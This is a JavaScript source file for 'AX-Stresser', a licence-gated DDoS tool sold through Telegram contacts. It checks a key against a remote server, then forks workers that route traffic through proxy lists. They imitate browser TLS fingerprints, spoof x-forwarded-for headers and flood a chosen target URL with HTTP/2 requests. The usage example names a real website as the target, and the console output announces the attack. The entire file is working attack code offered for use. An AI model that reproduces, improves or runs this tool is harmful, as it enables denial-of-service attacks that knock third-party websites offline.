const axios = require('axios');

function validateKeyAndStartScript(inputKey, targetURL, time, threads, requestsPerSecond) {
axios.get(`https://teamax003.serv00.net/AX-Stresser/?key=${inputKey}`)
        .then(response => {
            if (response.data.status === 'success') {
    console.log(``);
    console.log(``);
                console.log('\033[92m [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> 𝙰𝚞𝚝𝚑𝚎𝚗𝚝𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 ! \033[97m');
                    console.log(``);
    console.log(``);
                startScript(targetURL, time, threads, requestsPerSecond);
            } else {
    console.log(``);
    console.log(``);
                console.log('\033[38;2;255;23;68m [ 𝐅𝐀𝐈𝐋𝐄𝐃 ] -> 𝚄𝚗𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚄𝚜𝚎𝚛 !\033[97m');
                    console.log(``);
    console.log(``);
               process.exit();
            }
        })
        .catch(error => {
    console.log(``);
    console.log(``);
            console.error('\033[38;2;255;23;68m [ 𝐅𝐀𝐈𝐋𝐄𝐃 ] -> 𝙴𝚛𝚛𝚘𝚛 𝙾𝚌𝚌𝚞𝚛𝚛𝚎𝚍 𝚆𝚑𝚒𝚕𝚎 𝚅𝚊𝚕𝚒𝚍𝚊𝚝𝚒𝚗𝚐 𝚔𝚎𝚢:', error.message); 
                console.log(``);
    console.log(``);
process.exit();
        });
}

function startScript(targetURL, time, threads, requestsPerSecond) {
    console.log('\033[92m [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> 𝚃𝚊𝚛𝚐𝚎𝚝 𝙻𝚘𝚌𝚔𝚎𝚍 𝙱𝚢 𝚃𝚎𝚊𝚖 𝙰𝚇 \033[97m');
    // Rest of your script goes here...

    // Example of a loop to keep the script running until user exits
 //Developed By Khalid Mahmud
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 if (process.argv.length < 5){console.log(`\x1b[36m        Usage: node AX.js URL TIME REQ_PER_SEC THREADS\nExample: node AX.js https://xnxx.com/ 500 8 1`); process.exit();}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 
 const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
 const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_client_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 var proxyFile = "proxy.txt";
 var proxies = readLines(proxyFile);
 var userAgents = readLines("ua.txt");
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5]
 }
 
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        //console.log("Threads " + counter +  " started.");
        cluster.fork();
    }
    
    console.clear();

    console.log(`
\x1b[0m    ⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⣾⡳⣼⣆⠀⠀⢹⡄⠹⣷⣄⢠⠇⠻⣷⣶⢀⣸⣿⡾⡏⠀⠰⣿⣰⠏⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣀⣀⣀⡹⣟⡪⢟⣷⠦⠬⣿⣦⣌⡙⠿⡆⠻⡌⠿⣦⣿⣿⣿⣿⣦⣿⡿⠟⠚⠉⠀⠉⠳⣄⡀⠀⠀⠁⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⡀⢀⣼⣟⠛⠛⠙⠛⠉⠻⢶⣮⢿⣯⡙⢶⡌⠲⢤⡑⠀⠈⠛⠟⢿⣿⠛⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⡸⠯⣙⠛⢉⣉⣙⣿⣿⡳⢶⣦⣝⢿⣆⠉⠻⣄⠈⢆⢵⡈⠀⠀⢰⡆⠀⣼⠓⠀⠀    Wow!   ⠈⣷⠀⠀
\x1b[0m    ⠀⠀⠀⠖⠉⠻⣟⡿⣿⣭⢽⣽⣶⣈⢛⣾⣿⣧⠀⠙⠓⠀⠑⢦⡀⠹⣧⢂⠀⣿⡇⢀⣿⠺⠇⠀ AX-Stresser⠀⣿⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠐⠈⠉⢛⣿⣿⣶⣤⣈⠉⣰⣗⡈⢛⣇⠀⣵⡀⠀⠘⣿⡄⢻⣤⠀⢻⡇⣼⣧⣿⡄⠀ Is Too Much⠀⠀⡿⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⣠⣾⣿⢍⡉⠛⠻⣷⡆⠨⣿⣭⣤⣍⠀⢹⣷⡀⠀⠹⣿⡄⠈⠀⢿⠁⣿⣿⠏⠀   Powerful. ⠀⣇⠀⠀
\x1b[0m    ⠀⣿⣇⣠⣾⣿⣛⣲⣿⠛⠀⠀⢀⣸⣿⣿⣟⣮⡻⣷⣤⡙⢟⡀⠀⠙⢧⠀⠀⠎⠀⠉⠁⠰⣿⠀⠀        ⠀⢀⡿⠀⠀
\x1b[0m    ⠀⠈⢻⣿⣿⣽⣿⣿⣿⣴⡏⠚⢛⣈⣍⠛⠛⠿⢦⣌⢙⠻⡆⠁⠀⠀⠀⣴⣦⠀⠀⠀⠐⢳⢻⣦⣀⠀⠀⠀⠀⠀⠀⠀⢀⠮⠀⠀⠀
\x1b[0m    ⠀⠀⠈⠙⣿⣧⣶⣿⠿⣧⣴⣿⢻⡉⠀⢀⣠⣴⣾⡟⠿⠃⠁⣠⣤⡶⣾⡟⠅⠀⣀⡄⠀⣾⢸⣿⣏⢻⢶⣦⣤⣤⣄⢶⣾⣿⣡⣤⡄⠀
\x1b[0m    ⠀⠀⣠⣞⣋⣿⣿⣾⣿⡿⡛⣹⡟⣤⢰⡿⠟⠉⣀⣀⣤⣤⡠⠙⢁⣾⡿⠂⠀⣿⠟⣁⠀⣹⠀⣹⣿⡟⣼⣿⣿⣌⣿⣞⣿⣿⠁⠀⠀⠀
\x1b[0m    ⠀⢠⡿⢛⢟⣿⣿⣿⣿⣿⣿⡟⣼⣿⣟⢓⠛⣿⣏⣿⣵⣗⣵⣴⣿⢟⡵⣣⣼⣿⢟⣵⣶⢻⣶⣿⠀⠀⣈⢻⣿⣿⣿⢿⣾⢿⣧⠀⠀⠀
\x1b[0m    ⠀⠘⠃⢸⣿⡾⣿⣿⣿⣿⣯⣿⣿⣿⣶⣿⣿⣟⣾⡿⣫⣿⣿⣿⣽⣿⣿⣿⣿⢫⣾⣿⣿⣿⣿⣿⣴⡆⣻⣿⡏⣿⢻⣧⣿⡿⣿⡆⠀⠀
\x1b[0m    ⠀⠀⠀⠜⣿⣾⢿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣭⣿⣖⣿⢿⣿⡿⣿⣿⣿⡿⢡⢯⣿⣿⣿⣿⣿⣿⣿⣧⡿⣾⣷⣿⣿⢿⣿⡇⠉⠁⠀⠀
\x1b[0m    ⠀⠀⠀⠀⣿⣥⣾⣿⣿⣿⣿⣿⣿⣿⡇⣭⣿⣿⣿⣿⠃⠞⠟⣸⣿⠏⣸⣧⣀⠿⢿⣿⣿⣟⣿⣿⣿⣿⣽⣿⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠈⠛⣹⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣟⣿⣿⡿⢶⣦⣄⣿⠏⠀⣿⣟⣿⣶⠾⣿⣟⣋⣛⣿⣿⣿⣿⡇⣻⣿⣿⣿⡏⠀⠀⠀⠀⠀
\x1b[38;5;117m    ⠀⠀⠀⠀⠟⠛⠫⣿⣿⣿⣿⣿⡿⣧⠛⣿⠛⣿⣿⣿⣷⡌⠹⡟⠀⠀⠉⡟⠋⢠⣾⣿⣿⣿⡟⣿⣿⣿⣿⢀⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
\x1b[38;5;117m    ⠀⠀⠀⠀⠀⠀⠘⠋⣾⣷⣿⣿⣧⠙⠀⠙⢣⠝⠛⠋⣽⣷⢦⠇⠀⠀⠘⠁⣤⣾⣿⠝⠛⠉⠘⢻⣿⣿⢿⣼⣷⡟⢻⣷⠉⠀⡀⠀⠀⠀
\x1b[38;5;117m    ⠀⠀⠀⠀⠀⠀⠀⠐⠟⢻⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⣾⠟⠀⢸⣷⣿⡇⠀⠛⠀⠀⠁⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠁⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢻⡿⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠲⣄⠀⡄⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⣀⠀⠀⣠⣾⣿⠁⠀⠀⠀⠀⠀⣀⡄⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢻⣆⠀⠛⠁⠶⣶⣶⣶⣶⣶⣶⡶⠆⠘⠋⣠⡾⢫⣾⡟⠀⠀⠀⠀⠀⠐⠉⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠙⣷⡀⠀⠀⠙⠛⠛⠛⠛⠋⠁⠀⢀⣴⠋⠀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣰⣦⡀⠸⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠁⠀⠐⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⡄⢺⣿⡄⠹⣿⠻⢦⣤⣤⣤⣤⣶⣿⡟⢀⣀⠀⠀⢸⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣮⣿⣿⡀⠹⡷⣦⣀⡀⡀⢸⣿⠏⢠⣾⣿⠀⠀⣾⣿⣿⣿⣿⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m    ⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠘⣷⣻⡟⠀⡼⠁⣴⣿⣿⣯⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀
\x1b[0m    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣿⣤⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄
\x1b[0m    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ `);
 
    console.log(``);
    console.log(``);
    console.log(`\x1b[36m        𝔸𝕏 𝕊𝕋ℝ𝔼𝕊𝕊𝔼ℝ [𝔹𝔼𝕋𝔸]`);
    console.log('\033[38;2;255;23;68m        [ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 ] -> 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘\x1b[36m ∞');    
    
    console.log(`\x1b[36m        𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 𝐓𝐞𝐚𝐦 𝐀𝐗`);
    console.log(`\x1b[36m        𝗵𝘁𝘁𝗽𝘀://𝘁.𝗺𝗲/𝗧𝗲𝗮𝗺𝗔𝗫_𝟬𝟯`);
    console.log(``);
    console.log(``);
    console.log(`\x1b[0m        [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> Attack Has Been Sent Successfully`);
    console.log('\x1b[0m        [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> Target: ' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[0m        [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> Time: ' + args.time + '\x1b[0m');
    console.log('\x1b[0m        [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> Threads: ' + args.threads + '\x1b[0m');
    console.log('\x1b[0m        [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> Requests Per Second: ' + args.Rate + '\x1b[0m');
    console.log(`\x1b[38;2;255;23;68m
    [ 𝐌𝐄𝐓𝐇𝐎𝐃 ] -> [𝐆𝐄𝐓] [𝐏𝐎𝐒𝐓] [𝐂𝐅𝐁] `);
    console.log(``);

  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000); 

} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 0) }}
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true)
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
 function randomCharacters(length) {
     output = ""
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
     }
     return output;
 }
 
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
 headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
 headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
 headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "same-origin";
 headers["upgrade-insecure-requests"] = "1";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
     /** headers dynamic */
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = randomElement(userAgents);
     headers["x-forwarded-for"] = parsedProxy[0];
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true)
 
         const settings = {
             enablePush: false,
             initialWindowSize: 1073741823
         };

         const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: settings,
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
             //socket: connection,
         });
 
         client.setMaxListeners(0);
         client.settings(settings);
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});

    const interval = setInterval(() => {
       
    }, 2000);
}

function askForKey(targetURL, time, threads, requestsPerSecond) {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    readline.question('𝙴𝚗𝚝𝚎𝚛 𝚈𝚘𝚞𝚛 𝙻𝚒𝚌𝚎𝚗𝚌𝚎 𝙺𝚎𝚢: ', key => {
        validateKeyAndStartScript(key, targetURL, time, threads, requestsPerSecond);
        readline.close();
    });
}

function runWithArgs(args) {
    const targetURL = args[2];
    const time = args[3];
    const threads = args[4];
    const requestsPerSecond = args[5];
    const key = args[6];

    validateKeyAndStartScript(key, targetURL, time, threads, requestsPerSecond);
}

// Check if enough arguments are provided from the command line
if (process.argv.length >= 7) {
    runWithArgs(process.argv);
} else {
    console.log(`\x1b[36m        Usage: node AX.js URL TIME REQ_PER_SEC THREADS LICENCE_KEY\nExample: node AX.js https://xnxx.com/ 500 8 1 0000`); 
    
    console.log(``);
    console.log(``);
    console.log('\033[92m Want Key? Contact Me -> https://t.me/KHALID_MODZ');
    process.exit();
}

// Wait for user input to prevent automatic exit
process.stdin.on('data', () => {
    // User input detected, do nothing to prevent automatic exit
});
